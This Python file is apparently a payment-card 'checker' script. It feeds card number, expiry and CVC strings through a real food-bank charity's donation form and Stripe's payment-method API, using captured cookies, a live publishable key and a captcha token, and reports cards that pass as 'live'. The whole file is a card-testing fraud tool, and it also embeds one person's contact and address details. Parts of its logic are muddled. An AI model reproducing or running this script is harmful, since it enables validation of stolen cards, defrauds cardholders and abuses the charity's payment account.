import requests
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	import requests
	
	cookies = {
	    '_ga': 'GA1.1.1638711518.1720798609',
        '__stripe_mid': '0e71dee9-31c4-403c-acdc-2ae8fe4e6f20745fed',
        '__stripe_sid': 'df18e1da-b04f-4eda-b158-8bf24fab817ae58700',
        'wp-give_session_417ff7d53c39d7df88128bf064b1af2b': 'a97f6a2028c9182b6bd9574bc143df2a%7C%7C1721403564%7C%7C1721399964%7C%7C71ada89c4d3c88c038d57bebf387f0b4',
        'wp-give_session_reset_nonce_417ff7d53c39d7df88128bf064b1af2b': '1',
        '_ga_V7ZJFZ17HT': 'GS1.1.1720798608.1.1.1720798768.0.0.0',
	}
	
	headers = {
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://bendigofoodshare.org.au',
    'priority': 'u=0, i',
    'referer': 'https://bendigofoodshare.org.au/donate/?form-id=2858&payment-mode=stripe&level-id=0',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
	}
	
	data = {
	'give-fee-amount': '0.46',
    'give-fee-mode-enable': 'false',
    'give-fee-status': 'enabled',
    'give-honeypot': '',
    'give-form-id-prefix': '2858-1',
    'give-form-id': '2858',
    'give-form-title': 'Donate Today',
    'give-current-url': 'https://bendigofoodshare.org.au/donate/',
    'give-form-url': 'https://bendigofoodshare.org.au/donate/',
    'give-form-minimum': '5.00',
    'give-form-maximum': '999999.99',
    'give-form-hash': '8acf785170',
    'give-price-id': '0',
    'give-recurring-logged-in-only': '',
    'give-logged-in-only': '1',
    '_give_is_donation_recurring': '0',
    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
    'give-amount': '5.00',
    'give_stripe_payment_method': 'pm_1PblaCCvsxJzUAIZxxz6iYkm',
    'give-fee-recovery-settings': '{"fee_data":{"all_gateways":{"percentage":"2.900000","base_amount":"0.300000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}',
    'payment-mode': 'stripe',
    'give_title': 'Mr.',
    'give_first': 'Firdaws',
    'give_last': 'Sapno',
    'give_email': 'dragontech177@gmail.com',
    'organisation_name': 'Metamodz',
    'trading_name': 'Meta',
    'abn': '',
    'reference': '',
    'phone': '01576593082',
    'card_name': 'Firdaws Amin',
    'billing_country': 'BD',
    'card_address': '189,east Dholipar,Dhaka',
    'card_address_2': '',
    'card_city': 'Dhaka',
    'card_state': 'DHA',
    'card_zip': '1236',
    'give_action': 'purchase',
    'give-gateway': 'stripe',
	    }
	
	response = requests.post('https://bendigofoodshare.org.au/donate/', cookies=cookies, headers=headers, json=data)
	ids=(response.json()['data']['id'])
	headers = {
	'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Firdaws+Sapno&billing_details[email]=dragontech177%40gmail.com&billing_details[address][line1]=189%2Ceast+Dholipar%2CDhaka&billing_details[address][line2]=&billing_details[address][city]=Dhaka&billing_details[address][state]=DHA&billing_details[address][postal_code]=1236&billing_details[address][country]=BD&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=afcb94b4-5458-4d97-b573-c70d45d516e283732a&muid=0e71dee9-31c4-403c-acdc-2ae8fe4e6f20745fed&sid=df18e1da-b04f-4eda-b158-8bf24fab817ae58700&pasted_fields=number&payment_user_agent=stripe.js%2F6c8b4b9154%3B+stripe-js-v3%2F6c8b4b9154%3B+split-card-element&referrer=https%3A%2F%2Fbendigofoodshare.org.au&time_on_page=58227&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1DtOGwCvsxJzUAIZ&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQaTjana5s-iofs3mE2PM8fnigoOA3tYgl10HVGK23ORXGuf2K2SAOrF7_YjCRU0IIDyKsSCxInLk0YiLZMqtFPsj6d1pkRd85qsmNd7v6qWR-sC0y6Nkx7M1hJTNMr2v7-7z2WOYpwBJTUP-D7gjdeF8EJZK5PmASvS6tabqVBS1muYfl8XU64XOqBhGxpWEvHmJhX2FFTg0AQZY-DSUnoUvVB0-lvtX_jZBWlCDm0pEat9rh0WzbJ3tuj39eu5xnQwRRebKEhplX1QNxB3QLEWa-IYHPJVuQNLNmBtndof0soABtrRsE9Xu5xqwQFft_Gzg1L7doNv5uVQZHsBtYeJywn2ANoL1Amjz0nwyQpqlSPFiNvB0PQX6PUprE0bOYb7H-8RcJERbyboieHvo8GMTmfQcPjM683bZBU0mcAtQw6HhFQ0URGm2VTS9kjIS-EWvp6_rPFslJ94ZinW4bkSXrNOzSsJCckWxSy1_DwzCo2k5aXMKxI7k9psW3UKOUpFtALwLqo-Jk9ljbmskqMhkXcB5iAepRDR0cY2xxdIDsOGQMQ156C3_DolX7mKE5yTJnTEn-JISCwFjumqf7rpjKbE5amVnNxm2gD7YHFKcGRXrxM8p4EdZYPV-E_eTzS8jhR2scDQeg_a1CBXRkFEmrH4ySWOTeDRm67DAbKsIHBEdj27XJeYd8_KokStEwgkSJlE0ICuBZFed-vpGman6Y6CbLSbKgXUIaLnSROQY94w0NPj4DYK9YRJG7QH_8ge9ulsTAUVt9Z9m2Wqr2t0Skfx9HKySipEAIptuduUhinlw4ckv6-HyCgyiPUhQ8ozoVYzdmsKObGykEOu8Nx_2mGtz1GYABSeUlRuEvOxzkW4MtAr3Ua2b3nEvnsKmMMjhcKAOfDJOQXg8ieUXMUHsSjpE5vz6cQrX3mnyVmD4kXL28f2PjDAeTsSqnuWBCaF4w2AKcB2IVXrz3l3wJbqsXd7_Cjzok-d3XsWxZpOtVPEw3m7rkAV56gR5Yp8sYYwW0w4zwl92KEpCARotVXMvPqdqngHGXXlrami3qd76s5htSCHDzkx-6daOoxdajTgj9ZK-CLZMKz-8PhakdBoyjkIsJeoJ1-PKnXvUEOuPF2NWo6ciRG2MQqpW9Sr7OEkQQTeFyBgi2_hq-oQ_eLu5O5qEw_1rTXETiiIZLSW0OION8PaDwjSUTDzk5ReFfajo7wZS5JY2TBAA_I0tCxEOjeOfH39-0bn_FKYT36HDjHrdgIXFalSx5aBV_zpasQRXyCP9vl79BQc8W0h-SVrySzjOhIpfug9NNlaaFuEy9cd9hyyQL6D-Nna3Yke0Cn60GWob0KBB_sLmJzTlBKDizKQulCmlrGvdoWfHRav_e7x2owHgVOoT9CN7pZ8OWsRTCEWimicwVkksgomZ7ZGJkQ26UDq_sYtobgHg0ECSd0hBCQKz5_FDGBTe9OZvA4sHAaYySLeq6FNJXebk5W5pPKTs1mDk4DuEt071Kv2SD6-jgQ7KIZaBk5dL4Hxk8WQ6q_vBDd-l8nTJss0W-d8fTjnNKLuyZJe_DNvQYJO80plDiMbXB_k1QrNFTaxkx_fv7PmFuUnpHEkKn2AWwrAfa-4k8bu0aoYLzfYfFxD_AIcHeZY_LuiLTjUi_xdE7K7fOdZlslVL1_Cl2NFNKK2qopnyUPyiArzJxwBOVCdlPEp-EDdqfnpZoFaC4V78OAL3QQ37TUpzxITZrlF2YmUA63Kq39dmPziaqRu_Vl-tG-ogAtosFXwEPX5j73SypeYYz2t0QBukqZ_JRIP50YaHIRKd4rrQVgsdzuKVDODAGOjydaMi0DUM4RTi8yRKaXcvaRp99np30fA9yeOwH9-Bhb7n94lFgQ9sF4OS0GtLpIGV1D1G2ysdFvDZYe0Y5dz-eWDW-0Ao-144WuQwD-s4ffbAiJ7p187ucsSn7F5FnwWIXclrS6WoHvRS8XXwHnC09kHjKd4l5bcmXfsyjyj3T_FmyE6ijbRutkwRxcek5NQrvBM49U6Aj6nSR8eiQ-UntTgKLFK4hLuL9Sd9rBuI0AHH_atnKRDX62YNoR8Q-UFn6z1cGOOljKxiw2mPOJxNCjeGr-gwpb24_6Tc8nccM7QVm-6Qn09s-TjhIfDWmFlK05mxMUu5C9IY6PlJ3l-TCKD8i_K4bw9hFW3SvZyA829-TPUHkNL9nLhGDljMxE8K1_-UplDJxH_UDaAzmkiaVhRo2V4cM5mkU6uqHNoYXJkX2lkzhWZ5FSia3KoMjYxZTM1NmaicGQA.x7WPq4THocHBub1bmZ17pByYIJ50xs3-QVc9_pa6g3o'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=(response.json()['id'])
	try:
		ii=(response.json()['Error'][0]['There was an issue with your donation transaction'])
		return ii
	except:
		print(response.json())
		return 'live'